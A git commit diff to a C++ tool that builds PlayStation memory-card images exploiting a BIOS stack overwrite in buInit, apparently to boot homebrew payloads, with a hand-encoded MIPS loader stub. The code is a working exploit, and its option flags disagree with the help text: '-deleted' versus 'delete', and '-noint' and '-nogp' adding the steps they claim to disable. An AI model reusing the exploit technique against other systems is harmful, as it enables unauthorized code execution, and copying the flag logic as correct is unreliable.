2f26659e7013caf0f86f43b2e6aa6b47a6b8223d
Nicolas 'Pixel' Noble <pixel@nobis-crew.org>
2021-04-11 22:03:11 -0700

    Encoder cleanup and customization.

--- builder/builder.cc
+++ builder/builder.cc
@@ -4,11 +4,13 @@
 
 #include <array>
 #include <string>
-#include <vector>
 #include <unordered_map>
+#include <vector>
 
 #include "encoder.hh"
 #include "flags.h"
+
+using namespace Mips::Encoder;
 
 struct ExploitSettings {
     uint32_t stackBase;
@@ -19,13 +21,9 @@ struct ExploitSettings {
     constexpr static uint32_t maxFileSizeToUse = 0x7fffc000;
     constexpr static uint32_t maxIncrementPerSlot = 0x1ffff;
 
-    uint16_t index() const noexcept {
-        return static_cast<uint16_t>((addressToModify - stackBase) / 4);
-    }
+    uint16_t index() const noexcept { return static_cast<uint16_t>((addressToModify - stackBase) / 4); }
 
-    uint32_t difference() const noexcept {
-        return newValue - originalValue;
-    }
+    uint32_t difference() const noexcept { return newValue - originalValue; }
 
     int nbSlotsNeeded() const noexcept {
         // Each slot allows to increment at most by 0x1ffff.
@@ -35,9 +33,7 @@ struct ExploitSettings {
         return result;
     }
 
-    uint32_t fileSizeToUseForLastSlot() const noexcept {
-        return (difference() % maxIncrementPerSlot) * 0x4000;
-    }
+    uint32_t fileSizeToUseForLastSlot() const noexcept { return (difference() % maxIncrementPerSlot) * 0x4000; }
 
     bool valid() const noexcept {
         // Index must be <= 0xfffe.
@@ -56,7 +52,7 @@ struct ExploitSettings {
 // Maps BIOS version (e.g. 9002) to its exploits settings.
 static std::unordered_map<uint32_t, ExploitSettings> biosExploitSettings = {
     // Overwrite "jal set_card_auto_format", called right after buInit
-    {9002, {0x801ffcd0, 0x80231f50, 0x0c01a144, 0x0c082f92}}
+    {9002, {0x801ffcd0, 0x80231f50, 0x0c01a144, 0x0c082f92}},
 };
 
 static void banner() {
@@ -81,14 +77,22 @@ static void usage() {
         "\t\tbuilder -base 0x801ffcd0 -vector 0x802009b4 -old 0x4d3c -new 0xbe48 -in payload.bin -out card.mcd -tload "
         "0x801b0000\n");
     printf("\n");
-    printf("-bios     the BIOS version, as 3 or 4 digits (e.g. 9002). If you use this option, don't use base, vector, old, and new.\n");
+    printf(
+        "-bios     the BIOS version, as 3 or 4 digits (e.g. 9002). If you use this option, don't use base, vector, "
+        "old, and new.\n");
     printf("-base     the base address of the stack array being exploited from buInit\n");
-    printf("-vector   the address of the value we want to modify. Use 0x802 as a prefix, e.g. 0x802009b4 to modify value at address 0x09b4.\n");
+    printf(
+        "-vector   the address of the value we want to modify. Use 0x802 as a prefix, e.g. 0x802009b4 to modify value "
+        "at address 0x09b4.\n");
     printf("-old      the original value to modify\n");
     printf("-new      the new value we want to set\n");
     printf("-in       the payload file; if it is a ps-exe, tload is optional\n");
     printf("-out      the output filename to create\n");
     printf("-tload    if 'in' is a binary payload, use this address to load and jump to\n");
+    printf("-return   make a payload that allows returning to the shell\n");
+    printf("-noint    disable interrupts during payload\n");
+    printf("-nogp     disable setting $gp during payloads\n");
+    printf("-deleted  use deleted fake entries\n");
 }
 
 static uint32_t getU32(const uint8_t* ptr) {
@@ -131,8 +135,10 @@ int main(int argc, char** argv) {
     auto tloadStr = args.get<std::string>("tload");
 
     const bool biosVersionPresent = biosVersionStr.has_value();
-    const bool anyExpertArgPresent = baseStr.has_value() || vectorStr.has_value() || oldAddrStr.has_value() || newAddrStr.has_value();
-    const bool allExpertArgsPresent = baseStr.has_value() && vectorStr.has_value() && oldAddrStr.has_value() && newAddrStr.has_value();
+    const bool anyExpertArgPresent =
+        baseStr.has_value() || vectorStr.has_value() || oldAddrStr.has_value() || newAddrStr.has_value();
+    const bool allExpertArgsPresent =
+        baseStr.has_value() && vectorStr.has_value() && oldAddrStr.has_value() && newAddrStr.has_value();
     // Check in and out presence
     if (!inName.has_value() || !outName.has_value()) {
         usage();
@@ -196,7 +202,9 @@ int main(int argc, char** argv) {
     }
 
     if (!exploitSettings.valid()) {
-        printf("Exploit settings are not valid; either too many slots are needed, or the address to modify is out of range.\n");
+        printf(
+            "Exploit settings are not valid; either too many slots are needed, or the address to modify is out of "
+            "range.\n");
         return -1;
     }
 
@@ -213,7 +221,7 @@ int main(int argc, char** argv) {
         uint32_t fileSize = last ? exploitSettings.fileSizeToUseForLastSlot() : ExploitSettings::maxFileSizeToUse;
         // Note: exploit will fail if the value at the fake directory entry is 0xAX or 0x5X, depending of this value.
         // If it fails, change to 0xA1.
-        out[offset] = 0x51;
+        out[offset] = args.get<bool>("delete", false) ? 0xa1 : 0x51;
 
         out[offset + 4] = fileSize & 0xff;
         fileSize >>= 8;
@@ -286,69 +294,114 @@ int main(int argc, char** argv) {
         }
     }
 
+    constexpr unsigned firstUsableFrame = 64;
+
     if (sp == 0) sp = 0x801ffff0;
     unsigned frames = (tsize + 127) >> 7;
-    constexpr unsigned availableFrames = ((128 * 1024) >> 7) - 17;
+    constexpr unsigned availableFrames = ((128 * 1024) >> 7) - firstUsableFrame;
     if (frames > availableFrames) {
         printf("Payload binary too big. Maximum = %i bytes\n", availableFrames * 128);
         return -1;
     }
-    memcpy(out.data() + 17 * 128, payloadPtr, tsize);
+    memcpy(out.data() + firstUsableFrame * 128, payloadPtr, tsize);
 
-    //TODO: option to keep stack pointer as is, so that the shell can resume its execution.
-    uint32_t payload[] = {
+    std::vector<uint32_t> disableInterrupts = {
         // disabling all interrupts except for memory card
-        Mips::Encoder::addiu(Mips::Encoder::Reg::V0, Mips::Encoder::Reg::R0, 128),
-        Mips::Encoder::lui(Mips::Encoder::Reg::V1, 0x1f00),
-        Mips::Encoder::sw(Mips::Encoder::Reg::V0, 0x1074, Mips::Encoder::Reg::V1),
+        addiu(Reg::V0, Reg::R0, 128),
+        lui(Reg::V1, 0x1f00),
+        sw(Reg::V0, 0x1074, Reg::V1),
+    };
 
+    std::vector<uint32_t> saveRA = {
+        addiu(Reg::S3, Reg::RA, 0),
+    };
+
+    std::vector<uint32_t> restoreVector = {
         // restoring old vector
-        Mips::Encoder::addiu(Mips::Encoder::Reg::V0, Mips::Encoder::Reg::R0, oldAddr),
-        Mips::Encoder::sw(Mips::Encoder::Reg::V0, vector, Mips::Encoder::Reg::R0),
+        addiu(Reg::V0, Reg::R0, exploitSettings.originalValue),
+        sw(Reg::V0, exploitSettings.addressToModify, Reg::R0),
+    };
 
+    std::vector<uint32_t> loadBinary = {
         // S0 = number of frames to load
-        Mips::Encoder::addiu(Mips::Encoder::Reg::S0, Mips::Encoder::Reg::R0, frames),
+        addiu(Reg::S0, Reg::R0, frames),
         // S1 = destination address
-        Mips::Encoder::lui(Mips::Encoder::Reg::S1, getHI(tload)),
-        Mips::Encoder::addiu(Mips::Encoder::Reg::S1, Mips::Encoder::Reg::S1, getLO(tload)),
+        lui(Reg::S1, getHI(tload)),
+        addiu(Reg::S1, Reg::S1, getLO(tload)),
         // S2 = frame counter (set to 0)
-        Mips::Encoder::addiu(Mips::Encoder::Reg::S2, Mips::Encoder::Reg::R0, 0),
+        addiu(Reg::S2, Reg::R0, 0),
         // read_loop:
         // A0 = deviceID (0)
-        Mips::Encoder::addiu(Mips::Encoder::Reg::A0, Mips::Encoder::Reg::R0, 0),
-        // A1 = frame counter + 17
-        Mips::Encoder::addiu(Mips::Encoder::Reg::A1, Mips::Encoder::Reg::S2, 17),
+        addiu(Reg::A0, Reg::R0, 0),
+        // A1 = frame counter + firstUsableFrame
+        addiu(Reg::A1, Reg::S2, firstUsableFrame),
         // A2 = current destination address pointer
-        Mips::Encoder::addiu(Mips::Encoder::Reg::A2, Mips::Encoder::Reg::S1, 0),
+        addiu(Reg::A2, Reg::S1, 0),
         // increment frame counter
-        Mips::Encoder::addiu(Mips::Encoder::Reg::S2, Mips::Encoder::Reg::S2, 1),
+        addiu(Reg::S2, Reg::S2, 1),
         // mcReadSector(0, frame, dest)
-        Mips::Encoder::jal(0xb0),
-        Mips::Encoder::addiu(Mips::Encoder::Reg::T1, Mips::Encoder::Reg::R0, 0x4f),
+        jal(0xb0),
+        addiu(Reg::T1, Reg::R0, 0x4f),
         // mcWaitForStatus(0);
-        Mips::Encoder::addiu(Mips::Encoder::Reg::A0, Mips::Encoder::Reg::R0, 0),
-        Mips::Encoder::jal(0xb0),
-        Mips::Encoder::addiu(Mips::Encoder::Reg::T1, Mips::Encoder::Reg::R0, 0x5d),
+        addiu(Reg::A0, Reg::R0, 0),
+        jal(0xb0),
+        addiu(Reg::T1, Reg::R0, 0x5d),
         // if we still haven't reached our frame counter, go back 40 bytes (aka read_loop)
-        Mips::Encoder::bne(Mips::Encoder::Reg::S0, Mips::Encoder::Reg::S2, -40),
+        bne(Reg::S0, Reg::S2, -40),
         // increment destination pointer by sizeof(frame) in the delay slot
-        Mips::Encoder::addiu(Mips::Encoder::Reg::S1, Mips::Encoder::Reg::S1, 128),
+        addiu(Reg::S1, Reg::S1, 128),
+    };
 
+    std::vector<uint32_t> setGP = {
+        lui(Reg::GP, getHI(gp)),
+        addiu(Reg::GP, Reg::GP, getLO(gp)),
+    };
+
+    std::vector<uint32_t> bootstrapReturn = {
         // flush cache
-        Mips::Encoder::jal(0xa0),
-        Mips::Encoder::addiu(Mips::Encoder::Reg::T1, Mips::Encoder::Reg::R0, 0x44),
+        jal(0xa0),
+        addiu(Reg::T1, Reg::R0, 0x44),
 
         // bootstrap
-        Mips::Encoder::lui(Mips::Encoder::Reg::V0, getHI(pc)),
-        Mips::Encoder::addiu(Mips::Encoder::Reg::V0, Mips::Encoder::Reg::V0, getLO(pc)),
-        Mips::Encoder::lui(Mips::Encoder::Reg::GP, getHI(gp)),
-        Mips::Encoder::addiu(Mips::Encoder::Reg::GP, Mips::Encoder::Reg::GP, getLO(gp)),
-        Mips::Encoder::lui(Mips::Encoder::Reg::SP, getHI(sp)),
-        Mips::Encoder::jr(Mips::Encoder::Reg::V0),
-        Mips::Encoder::addiu(Mips::Encoder::Reg::SP, Mips::Encoder::Reg::SP, getLO(sp)),
+        lui(Reg::V0, getHI(pc)),
+        addiu(Reg::V0, Reg::V0, getLO(pc)),
+        jr(Reg::V0),
+        addiu(Reg::RA, Reg::S3, 0),
     };
-    static_assert(sizeof(payload) < 128, "Payload too big");
-    //TODO: ensure that checksum of payload sector is wrong (if it is good, the BIOS will erase it with data from the next sector).
+
+    std::vector<uint32_t> bootstrapNoReturn = {
+        // bootstrap
+        lui(Reg::RA, getHI(pc)),
+        addiu(Reg::RA, Reg::RA, getLO(pc)),
+        lui(Reg::SP, getHI(sp)),
+        addiu(Reg::SP, Reg::SP, getLO(sp)),
+
+        // flush cache
+        jal(0xa0),
+        addiu(Reg::T1, Reg::R0, 0x44),
+    };
+
+    std::vector<uint32_t> payload;
+    auto append = [&payload](std::vector<uint32_t>& block) {
+        std::copy(begin(block), end(block), std::back_inserter(payload));
+    };
+    if (args.get<bool>("noint", false)) append(disableInterrupts);
+    if (args.get<bool>("return", false)) append(saveRA);
+    append(restoreVector);
+    append(loadBinary);
+    if (args.get<bool>("nogp", false)) append(setGP);
+
+    if (args.get<bool>("return", false)) {
+        append(bootstrapReturn);
+    } else {
+        append(bootstrapNoReturn);
+    }
+    if (payload.size() >= 32) {
+        printf("Payload is too big, using %i instructions out of 32.\n", (int)payload.size());
+        return -1;
+    }
+    // TODO: ensure that checksum of payload sector is wrong (if it is good, the BIOS will erase it with data from the
+    // next sector).
     unsigned o = 0;
     for (auto p : payload) {
         out[0x800 + o++] = p & 0xff;
